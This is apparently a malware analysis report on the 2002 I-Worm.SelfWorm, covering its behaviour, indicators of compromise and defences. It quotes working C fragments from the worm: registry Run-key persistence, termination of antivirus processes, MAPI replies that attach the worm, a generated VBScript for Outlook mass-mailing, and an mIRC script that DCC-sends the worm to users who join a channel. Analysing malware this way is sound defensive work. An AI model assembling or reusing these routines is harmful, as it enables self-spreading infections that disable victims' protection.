# I-Worm.SelfWorm Analysis

## Overview
I-Worm.SelfWorm is a Windows worm written in C, developed by PetiK in April 2002. It spreads primarily through email using MAPI and Outlook, as well as via mIRC. The worm installs itself persistently, attempts to terminate antivirus processes, and includes a simple GUI for non-installed instances. It uses techniques like dynamic API loading, registry modifications for persistence, and VBScript for additional spreading. The code targets older Windows systems (e.g., Win95/98), leveraging Simple MAPI for mailing and ToolHelp for process manipulation.

Key behaviors:
- **Persistence**: Copies to system directory as `ShellW32.exe` and adds to HKLM Run key.
- **Spreading**: Replies to inbox messages with attachments, creates VBS for Outlook mass-mailing, infects mIRC with DCC send script.
- **Anti-AV**: Terminates processes of common AV tools (e.g., AVP, Norton, ZoneAlarm).
- **Payload**: Copies to startup folder; includes a GUI with "ABOUT" button.

The worm's name "SelfWorm" might refer to its self-replicating nature, including replying to emails with itself attached.

## Technical Analysis
The code uses Win32 APIs for installation, mailing, and process control. It dynamically loads MAPI32.DLL for email functions and uses ToolHelp32 for AV termination. Strings are hardcoded, and it includes a basic window procedure for a GUI.

### Code Excerpt 1: Installation and Persistence
This section handles copying the worm to the system directory and setting up registry persistence.
```c
GetModuleFileName(hInstance,filename,100);
GetSystemDirectory((char *)cpywrm,100);
strcat(cpywrm,"\\ShellW32.exe");
CopyFile(filename,cpywrm,0);

strcpy(copy2,cpywrm);
strcat(copy2," -i");

RegOpenKeyEx(HKEY_LOCAL_MACHINE,Run,0,KEY_WRITE,&hReg);
RegSetValueEx(hReg,"Shell32",0,REG_SZ,(BYTE *)copy2,100);
RegCloseKey(hReg);
```

### Code Excerpt 2: Anti-AV Process Termination
The worm scans and terminates AV processes using ToolHelp32Snapshot.
```c
void StopAV(char *antivirus)
{
register BOOL term;
lSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
uProcess.dwSize=sizeof(uProcess);
rProcessFound=Process32First(lSnapshot,&uProcess);
while(rProcessFound) {
    if(strstr(uProcess.szExeFile,antivirus)!=NULL) {    // Norton Antivirus
        myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
        if(myproc!=NULL) {
            term=TerminateProcess(myproc,0);
        }
        CloseHandle(myproc);
    }
    rProcessFound=Process32Next(lSnapshot,&uProcess);
}
CloseHandle(lSnapshot);
}
```
Called for specific AVs like "AVP32.EXE", "NAVAPW32.EXE", etc.

### Code Excerpt 3: Email Spreading via MAPI (Reply to Inbox)
Reads inbox messages and replies with the worm attached.
```c
if(mFindNext(session,0,NULL,NULL,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS) {
  do {
     if(mReadMail(session,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&mes)==SUCCESS_SUCCESS) {
    // ... setup reply message ...
    mes->lpFiles->lpszPathName=filename;
    mes->lpFiles->lpszFileName="funny_tool.exe";
    mes->lpFiles->lpFileType=NULL;
    mSendMail(session, NULL, mes, NULL, NULL);
    }
  }while(mFindNext(session,0,NULL,messId,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS);
```

### Code Excerpt 4: VBScript Generation for Outlook Spreading
Generates and executes a VBS file to mass-mail via Outlook.
```c
vbsworm=fopen("C:\\selfworm.vbs","w");
fprintf(vbsworm,"On Error Resume Next\n");
// ... VBS code to create Outlook app, iterate address lists, send emails ...
fprintf(vbsworm,"EM.Attachments.Add(%c%s%c)\n",34,cpywrm,34);
fclose(vbsworm);
ShellExecute(NULL,"open","C:\\selfworm.vbs",NULL,NULL,SW_SHOWNORMAL);
Sleep(3000);
DeleteFile("C:\\selfworm.vbs");
```

### Code Excerpt 5: mIRC Infection
Creates a script.ini to DCC send the worm on channel joins.
```c
void mirc(char *dir)
{
FILE *script;
script=fopen("C:\\script.ini","w");
fprintf(script,"[script]\n");
fprintf(script,"n0=on 1:JOIN:#:{\n");
fprintf(script,"n1= /if ( $nick == $me ) { halt }\n");
fprintf(script,"n2= /.dcc send $nick %s\n",cpywrm);
fprintf(script,"n3=}\n");
fclose(script);
CopyFile("C:\\script.ini",dir,0);
DeleteFile("C:\\script.ini");
}
```
Called for common mIRC paths.

## Indicators of Compromise (IOCs)
- **Files**:
  - `%System%\ShellW32.exe`
  - `C:\selfworm.vbs` (temporary)
  - `script.ini` in mIRC directories (e.g., `C:\mirc\script.ini`)
- **Registry**:
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shell32` = `%System%\ShellW32.exe -i`
- **Processes**:
  - `ShellW32.exe`
  - Terminated AV processes (e.g., AVP32.EXE, NAVAPW32.EXE)
- **Network/Email**:
  - Emails with subject "Re: NEW MAIL." and attachment "funny_tool.exe"
  - Outlook-sent emails with subject "Hi [Name] look at this." and body mentioning "funny tool"
- **Other**:
  - GUI window titled "SelfWorm 1.0" if not installed with -i

## Quirks and Notes
- The worm includes a GUI with an "ABOUT" button, but it's only shown when not installed (no -i flag). Installed instances show a message box instead.
- Uses outdated APIs like ToolHelp32 (Win9x/NT) and Simple MAPI, limiting compatibility with modern Windows.
- VBS spreading uses Outlook Object Model, which could be blocked by security settings.
- Hardcoded paths for mIRC and AVs make it less flexible but targeted for early 2000s environments.
- No encryption or obfuscation; code is straightforward with clear function names.

## Mitigation and Defense
- **Antivirus**: Use updated AV to detect and remove files/registry entries. Monitor for process terminations.
- **Email Filtering**: Block emails with suspicious subjects/attachments (e.g., "funny_tool.exe").
- **Registry Monitoring**: Watch for changes to Run keys.
- **Disable WSH**: Restrict Windows Script Host to prevent VBS execution.
- **Process Protection**: Use tools to prevent unauthorized process termination.
- **Best Practices**: Keep systems patched, use least-privilege accounts, and educate on email attachments.

This analysis is based on the source code `SelfWorm.c`. For dynamic analysis, run in a controlled VM.